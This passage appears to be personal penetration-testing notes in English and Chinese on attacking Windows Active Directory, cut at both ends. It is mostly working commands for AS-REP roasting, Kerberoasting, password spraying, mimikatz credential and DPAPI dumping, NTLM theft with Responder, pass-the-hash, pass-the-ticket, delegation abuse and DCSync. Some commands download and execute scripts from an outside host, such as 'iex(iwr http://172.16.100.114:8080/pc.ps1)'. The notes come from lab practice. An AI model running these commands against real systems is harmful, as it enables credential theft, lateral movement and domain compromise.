}

# enum all domain groups
$Searcher.filter = "(objectClass=Group)"

# enum secret groups
$Searcher.filter="(name=Secret_Group)"
$Searcher.filter="(name=Nested_Group)"


# Domain Admins : 
$Searcher.filter="memberof=CN=Domain Admins,CN=Users,DC=corp,DC=com"

# Computers: 
$Searcher.filter="objectcategory=CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com"
# Find Win10: 
 $Searcher.filter="operatingsystem=*windows 10*"


#-enum domain groups
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.name
}

#-enum group members
CN=Nested_Group,OU=CorpGroups,DC=corp,DC=com
//modify code 
$Searcher.filter="(name=Secret_Group)"
Foreach($obj in $Result)
{
$obj.Properties.member
}

# nested group
$Searcher.filter="(&(objectClass=group)(member=*)(memberof=*))"
$Result = $Searcher.FindAll()
Foreach ($obj  in  $Result) {
    Write-Host "group name: " $obj.Properties.name
    Write-Host "member name: " $obj.Properties.member
    Write-Host "memberof name: " $obj.Properties.member
    Write-Host  "------------------------"
}

```

## AD privilege
+ extract hash and password
+ lateral movement, pth/ptt/rbcd
+ delegation, unconstrained/constrained/rbcd
+ ACLs abuse

**about hashes and how they stored**
+ hashes stored in windows, in order to renew TGT
+ In current version of Windows, hashes stored in LSASS memory space. LSASS, Local Security Authority Subsystem Service
+ LSASS process is part of OS, and run an SYSTEM. Need SYSTEM(or local administrator) permission to gain access to the hashes.
+ stored hashes are also encrypted with an LSASS stored key.
+ dump hash need local administrator;
+ [Dump域内用户hash姿势](https://xz.aliyun.com/t/2527)， on dc

**Lateral Movement**, use lateral movement to compromise the machines our high-value targets are logged in to.
+ crack any password hashes, authenticate to a machine with cleartext passwords in order to gain unauthorized access.
+ authenticate to a system and gain code execution using only a user’s hash or a Kerberos ticket
+ [内网横向移动](https://blog.csdn.net/Captain_RB/article/details/107883264)
+ [深入研究Pass-the-Hash攻击与防御](https://xz.aliyun.com/t/7051)
+ [域渗透-凭据传递攻击(pass the hash)完全总结](https://www.cnblogs.com/-qing-/p/11374136.html#_label0)
+ [内网渗透-横向攻击](https://www.jianshu.com/p/7aaf6ef32b45?utm_campaign=haruki)
+ [内网渗透-免杀抓取hash](https://www.jianshu.com/p/00d70dc76678)
+ have got a Cred,what Do i do now? [Offensive Lateral Movement](https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/),
+ [use psexec tool to run commands get shell ](https://www.poftut.com/use-psexec-tools-run-commands-get-shell-remote-windows-systems/)
+ [useing credentials to own windowx box, psexec and service](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

### ASREPRoast
+ dumps the krbasrep5 hashes of user accounts that have kerberos pre-authentication disabled.
+ crackt the krbasrep5 hash

```bash
# rebeus looking for vulnerable users and then dump the hashes.
rebeus.exe asreproast

## insert 23$ after $krb5asrep$
 $krb5asrep$23$User

# hashcat crack
## 18200, Kerberos 5 AS-REP etype 23
hashcat -example-hashes | grep krb5
hashcat -m 18200 hash.txt Pass.txt

# impacket attack
## get hash of asreproastable account,  userlist or specific user.
GetNPUsers.py -usersfile domainuser.txt -no-pass -dc-ip $tip spookysec.local/ 
GetNPUsers.py -dc-ip $tip -no-pass spookysec.local/svc-admin

hashcat -m 18200 svc-admin.hash /usr/share/wordlists/sq00ky-adlist/passwordlist.txt
```
### Password Spraying
+ use LDAP and ADSI to perform a “low and slow” password attack against AD users without triggering an account lockout.
+ if you found userlist, cewl the dict to brute.
+ use smbpasswd/smbpasswd.py to change the default password.

**smbpasswd**
```bash
## smbpasswd not work
smbpasswd -r $tip -U bhult

smbpasswd.py bhult:Fabricorp01@fabricorp.local -newpass "Hack01@123"
smbpasswd.py bhult:Fabricorp01@fabricorp.local -newpass Hack02@123
```
**kerbrute**
```bash
# single password for user list
kerbrute passwordspray -d domain.com --dc ip userlist password
kerbrute passwordspray -d offensive.local --dc 192.168.159.200 offensiveuser.txt Password!
```

**crackmapexec**

```bash
# smb 
## --continue-on-success， 默认不指定时遇到正确密码停止
crackmapexec smb 10.200.74.117 -u ../domainuser.txt -p ../password.txt --continue-on-success
crackmapexec smb $tip -u username.txt -p 'NewIntelligenceCorpUser9876'
crackmapexec smb $tip -u username.txt -p 'NewIntelligenceCorpUser9876' --shares

# winrm
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -H hash.txt
```

**rebeus**

```bash
## rebeus password spraying; echo domain name to hosts first
## take a given password and spray it against all found users then give  the .kirbi TGT for that user
echo ip controller.local >> c:\windows\system32\drivers\etc\hosts
rebeus.exe brute /password:Password1 /noticket
```

**powershell**

```powershell
net accounts

## ps scripts
//powershell authentication 
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!")

## Spray-Passwrods
# https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1
-Pass, passwordk
-Admin, test admin account
-File, password list file
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin

#/each pwd in file against all active user account, excerpt privileged user(admincount=1)
.\Spray-Passwords.ps1 -File .\passwords.txt -Verbose
```


### Kerberoast
+ service account attacks
+ abuse service ticket and attemp to crack the password of service account/high-privilege service account in domains
+ kerberos protocol, service ticket使用4-40a50000-appsrv02$@LDAP~dc01.exam.com-EXAM.COM.kirbi SPN密码的hash进行加密；
+ attack: dumping NTDS.dit, if service account is a domain admin; if not admins, log into other system and pivot or escalate or password spray attack with the cracked pwd.
+ 
+ offensive course, p650
+ [hacktricks - kerberoast](https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast)
+ [pentest lab - invoke kerberoast](https://pentestlab.blog/tag/invoke-kerberoast/)
+ [V3teran - SPN和kerberoast攻击](https://blog.v3teran.xyz/2021/02/08/8ac3dc81.html)

**Invoke-Kerberoast**

```powershell
# https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1

# extract all account in spn
setspn -T medin -Q ​ */*

# invoke-kerberoast
Invoke-WebRequest -uri http://10.11.73.77/Invoke-Kerberoast.ps1 -outfile Invoke-kerberoast.ps1
import-module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -outputformat hashcat |fl
Invoke-Kerberoast -outputformat hashcat | Select hash | ConvertTo-CSV -NoTypeInformation

## no output, try with creds
$SecPassword = ConvertTo-SecureString 'Ashare1972' -AsPlainText -force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\amanda', $SecPassword)
Invoke-Kerberoast -Credential $Cred -outputformat hashcat |fl

# crack with hashcat/john
hashcat -m 13100 -a 0 fela.hash /usr/share/wordlists/rockyou.txt --force
```

**impacket on linux**
```bash
echo '10.10.111.19 corp' | sudo tee -a /etc/hosts
# domain/user:password, get the hash.
GetUserSPNs.py corp.local/dark:_QuejVudId6 -dc-ip $tip -request

hashcat -m 13100 -a 0 fela.hash /usr/share/wordlists/rockyou.txt --force
```

**rebeus kerberoast**
```bash
## dump the kerberos hash of any kerberoastable users.
rebeus.exe kerberoast
rebeus.exe kerberoast /nowrap

## with creds.
## error: [X] Error during request for SPN http/sizzle@HTB.LOCAL : No credentials are available in the security package
rebeus.exe kerberoast kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /nowrap
```

**hashcat/john crack**

```powershell
hashcat -m 13100 hash.txt pass.txt

//kirbi2john.py, kali 自带有问题，git kerberoast  执行执行convert
python kirbi2john.py 1.kirbi -o xx.hash
//kali apt upgrade john  1.9
https://github.com/nidem/kerberoast.git
john –format=krb5tgs crack_file — wordlist=dict.txt
```

**powershell traditional**
```powershell
#-1 get users with spns
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.196/GetUserSPNs.ps1', 'GetUserSPNs.ps1')
.\GetUserSPNs.ps1

#-2 request service ticket
// add system.indentitymodel namespace
Add-Type -AssemblyName System.IdentityModel
//requesting a service ticket
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'

Id                   : uuid-35d986c1-d7c2-4230-8969-0e4632c73b17-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
                       y}
ValidFrom            : 12/5/2021 4:26:56 PM
ValidTo              : 12/5/2021 9:06:13 PM
ServicePrincipalName : MSSQLSvc/xor-app23.xor.com:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

# display all cached kerberos tickets for current user
klist

#-exporting tickets from memery, to kirbi file
mimikatz
kerberos::list /export

#-kali 破解密码
apt update && apt install kerberoast
python ~/ptw/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-
Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```


### clear-text pwd
+ 8位以上的NTLM不易破解，尽量抓取明文密码
+ server 2012/windows 8之后版本的系统默认不会在内存中保存明文密码；确认注册表已经开启内存明文存储密码的注册表项

```bash
# 查询相应注册表项
reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential

# 修改注册表项，开启内存明文存储密码
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f

# 获取用户账号明文密码
privilege::debug
log passdump.log
sekurlsa::logonpasswords full
```

### rdp pwd

```bash
#-查看用户保存的凭证
dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*

#-mimikatz获取guidMasterKey
mimikatz privilege::debug
mimikatz dpapi::cred /in:C:\Users\test\AppData\Local\Microsoft\Credentials\8FC163874708FE28788127CF58FF4843

#-查找对应masterKey
mimikatz sekurlsa::dpapi  //wrong

#-使用MasterKey解密凭证文件
mimikatz dpapi::cred /in:C:\Users\test\AppData\Local\Microsoft\Credentials\8FC163874708FE28788127CF58FF4843 /masterkey:c0bf810227c26e7a523915e15*
```

### steal ntml
+ 利用dns poisoning or ssrf， 从http/web服务获取hash/creds;
+ 获取hash 后 crack or overpass the hash， 或 getST pass ticket
+ [hacktricks - relay attack](https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
+ practice machine: htb-intelligence,pg-heist
+ scf attack steal ntlm hash.

```bash
sudo apt install responder

sudo responder -I tun0 -A

# scf attack
## hello.scf
[Shell]
Command=2
IconFile=\\10.10.14.90\share\hello.ico
[Taskbar]
Command=ToggleDesktop

## crack hash. 
hashcat -m 5600 amanda.ntlmv2 /usr/share/wordlists/rockyou.txt --force
```

### Pass the Hash
**Pass the hash**, allows an attacker to authenticate to a remote system or service using a user’s NTLM hash instead of the associated plaintext password.
 
+ not work for Kerberos authentication but only for server or service using NTLM authentication.
+ third-party tools: PsExec from msf, Passing-The-hash toolkit, impacket
+ mechanics: attacker connect to the victim using Server Message block（SMB） protocol and performs authentication usering the NTLM hash.
+ [hacktricks - pass the hash](https://book.hacktricks.xyz/windows/ntlm#pass-the-hash)
+ kb2871997，禁用本地管理员账户远程连接,默认Administrator(SID 500)例外，可Pth; [参考](http://www.pwnag3.com/2014/05/what-did-microsoft-just-break-with.html); [freebuf](https://www.freebuf.com/articles/neopoints/245872.html)
+ KB22871997补丁与PTH, pth 不可用可考虑rdp（条件苛刻） [KB22871997补丁与PTH攻击](https://xz.aliyun.com/t/8690#toc-20)
+ 2003/vista引入UAC，本地管理员组的domain 用户及本地administrator用户(sid 500)可pth；
+ 禁用UAC时，本地管理员组本地用户同样可pth, 域用户亦可；[uac disable](https://docs.microsoft.com/en-US/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)
+ 域用户可通过kerberos认证pth，需配置hosts, 使用hostname（not ip）

```bash
#-pth-winexe
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd

# mimikatz, need admin privilege/run as admin
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 

# impacket binary for windows
# down:https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries
psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local

wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local

## cmd.exe/powershell.exe not valid, need to specify a command
atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'

## Impacket py
## https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py

## psexec.py
//获取半交互式shell
python3 psexec.py -hashes [LMhash]:NThash username@ipaddress 
//非交互式执行命令
python3 psexec.py -hashes [LMhash]:NThash username@ipaddress "command"

## wmiexec.py
//获取半交互式shell
python3 wmiexec.py -hashes [LMhash]:NThash username@ipaddress
//非交互式执行命令
python3 wmiexec.py -hashes [LMhash]:NThash username@ipaddress "command"

## smbexec.py
//获取半交互式shell
python3 smbexec.py -hashes [LMhash]:NThash username@ipaddress

## atexec.py
//非交互式执行命令
python3 atexec.py -hashes [LMhash]:NThash username@ipaddress "command"

# Evil-WinRM
evil-winrm -u <username> -H <Hash> -i <IP>

# Invoke-Thehash
## https://github.com/Kevin-Robertson/Invoke-TheHash
## SMBexec
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose

## WMIExec
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose

## SMBClient
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose

## SMBEnum
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose

## Ivoke-Thehash, mix of all others
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -hash F6F38B793DB6A94BA04A52F1D3EE92F0

```


### Pass the Key

**Overpass the hash/Pass the Key(PTK)**, over abuse a NTLM user hash to gain a full kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.

+ 利用 user NTLM hash 获取Kerberos Ticket
+ In order to perform this attack, the **NTLM hash (or password) of the target user account is needed**.
+ once a user hash is obtained, a TGT can be requested for that account. Finally, it is possible to **access** any service or machine **where the user account has permissions**
+ especially useful in networks where NTLM protocol is disabled and only Kerberos is allowed as authentication protocol.
+ [hacktricks-over-pass-the-hash-pass-the-key](https://book.hacktricks.xyz/windows/active-directory-methodology/over-pass-the-hash-pass-the-key)

```bash
# mimikatz - psexec 
## 查看logon password
mimikatz # sekurlsa::logonpasswords

## turn NTLM hash to kerberos ticket 
mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe

## authenticating a network share on dc, generate TGT
net use \\dc01
## list newly requested kerberos tickets
klist

## open remote connection using kerberos
.\PsExec.exe \\dc01 cmd.exe

# on linux/kali
## -aesKey [aes key], specify to use AES256
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass

# rebeus
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```

**python possible error**
+ `PyAsn1Error(‘NamedTypes can cast only scalar values’,) `: Resolved by updating impacket to the lastest version
+ `KDC can’t found the name` : Resolved by using the hostname instead of the IP address, because it was not recognized by Kerberos KDC


### pass the ticket - check the course
**path the ticket**, similar to Pass the Key; But instead of using hashes to request a ticket, the ticket itself is stolen and used to authenticate as its owner.
+ takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service.
+ dumping the TGT from the LSASS memory of the machine, notice the domain admins/domain service account tcikets.
+ this attack is greate for privilege escalation and lateral movement. 


```bash
# swaping linux and windows tickets between platforms
## https://github.com/Zer1t0/ticket_converter
## Converting ccache => kirbi
ticket_converter# python ticket_converter.py velociraptor.ccache velociraptor.kirbi

## Converting kirbi => ccache
ticket_converter# python ticket_converter.py velociraptor.kirbi velociraptor.ccache


# ptt attack
## linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass

## error:[Errno Connection error (controller-1.controller.local:445)] [Errno -2] Name or service not known
## echo the dns name to hosts
echo '10.10.195.194 controller-1.controller.local' | sudo tee -a /etc/hosts
psexec.py controller.local/administrator@controller-1.controller.local -k -no-pass

## windows
##Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi

klist #List tickets in cache to cehck that mimikatz has loaded the ticket

.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

### abuse AD ACLs/ACEs
+ interesting privileges over some domain objects that could let you move laterally/escalate privileges.
+ Generic all on user/group/computer
+ writeproperty on group
+ writedacl permission, Group: exchange windows; htb forest
+ ForceChangePassword, reset user's password via rpc
+ ad ACLs/ACEs abuse, [hacktricks acl-persistence-abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)

```bash
# writedacl, account operator
## exploit, check bloodhunter
## 1) add user, add to group 2) powerview add-domainobjectacl 3) dump hash

```

#### GenericWrite On User
+ set spn to kerberoast
+ set preauth to asrepoast

```bash
# kerberoast


# asrepoast 
## set-AdAccountcontrol to  asreproast
Get-ADUser Jorden | Set-ADAccountControl -DoesNotRequirePreAuth $true

## impacket exploit
GetNPUsers.py 'megacorp/jorden' -request

## crack
hashcat --example-hashes | grep krb5asrep -C 20
hashcat -m 18200 multimaster-jorden.asrephash ../rockyou.txt
```

#### ForceChangePassword
+ If we have ExtendedRight on User-Force-Change-Password object type, we can reset the user's password without knowing their current password:

```bash
# check the property
## Object type: User-Force-Change-Password
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}

# powerview reset password
Set-DomainUserPassword -Identity delegate -Verbose

## powerview one-liner, if no interactive session is not available
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# rpcclient reset
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```


### Creds reuse
+ If you have the hash or password of a local administrator you should try to login locally to other PCs with it.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

### MSSQL Trustlink- need to learn 

+ if a user has privileges to access MSSQL instances, he could be able to use it to execute commands in the MSSQL host (if running as SA).
+ [hacktricks mssql trust links](https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links)

```bash

```

### Unconstrained Delegation 
+ unconstrained delegation, from [red team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
  > Unrestricted kerberos delegation is a privilege that can be assigned to a domain computer or a user;
  > Usually, this privilege is given to computers (in this lab, it is assigned to a computer IIS01) running services like IIS, MSSQL, etc.;
  > Those services usually require access to some back-end database (or some other server), so it can read/modify the database on the authenticated user's behalf;
  > When a user authenticates to a computer that has unresitricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory;
  >The reason TGTs get cached in memory is so the computer (with delegation rights) can impersonate the authenticated user as and when required for accessing any other services on that user's behalf.
+ 攻击过程说明
  > User --- authenticates to ---> IIS server ---> authenticates on behalf of the user ---> DB server
  > computer IIS servier开启非约束委派，IIS 将保存所有访问用户TGT在内存中，以便提供相应的服务；
  > 获取IIS server system权限后导出高权限用户TGT，模拟该用户访问其他服务实现横向移动(cifs)
+ [Kerberos攻击技巧](https://xz.aliyun.com/t/8690#toc-63),[常见横向移动与域控维持](https://xz.aliyun.com/t/9382#toc-16)
+ other force auth tech, [hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse)


#### common usage
```bash
## powerview enum unconstrained computer
## DCs always appear but aren't useful for privesc
## useraccountcontrol contains TRUSTED_FOR_DELEGATION or ADS_UF_TRUSTED_FOR_DELEGATION.
Get-NetComputer -Unconstrained 
Get-Domaincomputer -Unconstrained | select name, dnshostname, useraccountcontorl

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# export high value account's ticket on the compromised target;
## Export tickets with Mimikatz
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# load ticket of admin in memory with mimikatz or rebeus for pass the ticket
## mimikatz, explort admininstrator's tgt
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

## import tgt, ptt attack
.\mimikatz.exe "kerberos::ptt kerberos::ptt [0;8c20d]-2-0-60810000-Administrator@krbtgt-HACKE.TESTLAB.kirbi" 

# rubeus Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Check every 10s for new TGTs
```

#### spool bug
+ 没有高权限用户访问IIS server时，可通过打印机bug进行认证获取高权限用户User B 的tgt
+ 如果获取到domain admins tgt， 可利用Dcsync 获取所有hash
+ [Spoolsample](https://github.com/leechristensen/SpoolSample.git)
+ [precompiled exe](https://github.com/jtmpu/PrecompiledBinaries)
+ [ired.team/domain compromise via dc print server and kerberos delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

```bash
# check if the target have spool
## if spoolss was not running, receive an error.
dir \\dc\pipe\spoolss

# spoolsample force authentication, make a print server login against any machine
.\SpoolSample.exe <printmachine> <unconstrinedmachine>

# rubeus monitor tgt
## tgt was base64 encoded.
.\Rubeus.exe monitor /targetuser:<username> /interval:10 /nowrap

# import ticket
rubeus.exe ppt /ticket:[b64 tgt]

# dcsync to obtain all the hashes
## mimikatz
mimikatz # lsadump::dcsync /domain:offense.local /user:spotless

## get hash
lsadump::dcsync /domain:offensive.local /all /csv
```

### Constrained Delegation
+ compromised a user account or computer(machine account/service account) that has kerberos constrained delegation enabled, it's possible to impersonate any domain user(including administrator) and authenticate to a service that the user account is trusted to delegate to.
+ 不同于非约束委派，约束委派对可通过委派访问的服务进行了限制，即约束委派的account `msds-allowedtodelegateto`中限定的服务（spn）
  > [from hacktricks constrained delegation], the spn(service name requested) is not being checked, only privilege; therefore, have access to cifs service, you can also access to HOST service using `/altservice` flag in rubeus.exe, HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights).
+ domain user account 设置spn后等同于 machine account（service account）
+ domain account useraccountcontrole flag `TRUSTED_TO_AUTH_FOR_DELEGATION`
+ this attack will be able to privesc and obtain all the hash(dcsync)
+ User is marked as `Account is sensitive and cannot be delegated`, not able to impersonate; [bypass guide](https://xz.aliyun.com/t/7454#toc-1)) , [bypass guide 2](https://xz.aliyun.com/t/9382#toc-18)
+ about S4U2self and S4U2proxy
  > S4U2serf, If a service account has a userAccountControl value containing TRUSTED_TO_AUTH_FOR_DELEGATION (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user; 即，约束委派的账号（service account）可以代用户申请访问自己的服务（service account设置的spn）的ticket(tgs/st1)
  > S4U2proxy, A service account could obtain a TGS on behalf any user to the service set in msDS-AllowedToDelegateTo. To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one. 即, 约束委派的账号（service account）代用户申请访问委派给自己的其他服务（msds-allowedtodelegateto spn）的ticket(tgs/st2)
+ the administrator/system privilege on the service machine is not necessary; password/hash is ok

```bash
# Enum account
## Powerview enum, check msds-allowedtodelegateto : spns, useraccountcontrol: TRUSTED_TO_AUTH_FOR_DELEGATION, 
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
## expand the property
get-domainuser -trustedtoauth | select -expand msds-allowedtodelegateto 

## ADSearch enum
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json

# exploit, service account(constrained delegate enabled) dcorp-adminsrv$
## 1. request tgt of service, which can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
.\Rubeus.exe tgtdeleg  ## current service account session

## have SYSTEM, dump AES key or the RC4 hash from memory and request one
mimikatz sekurlsa::ekeys
## Request with aes/rc4
## kekebo
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

## Rebeus.exe 
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi

## 2. Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

## 3. Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

## Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

## 4. Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local

## 2&3 Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

## 2&3&4 rubeus S4U and ptt
Rubeus.exe s4u /ticket:[ticket file|ticket base64] /impersonateuser:administrator /domain:offensive.local /msdsspn:cifs/dc.offensive.local /dc:dc.offensive.local /ptt

## /altservice, HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights).
Rubeus.exe s4u /ticket:[ticket file|ticket base64] /impersonateuser:administrator /domain:offensive.local /msdsspn:cifs/dc.offensive.local /altservice:host,wsman,http,krbtgt/dc:dc.offensive.local 

# kekeo + Mimikatz
## Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

## Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

## Load the TGS in memory
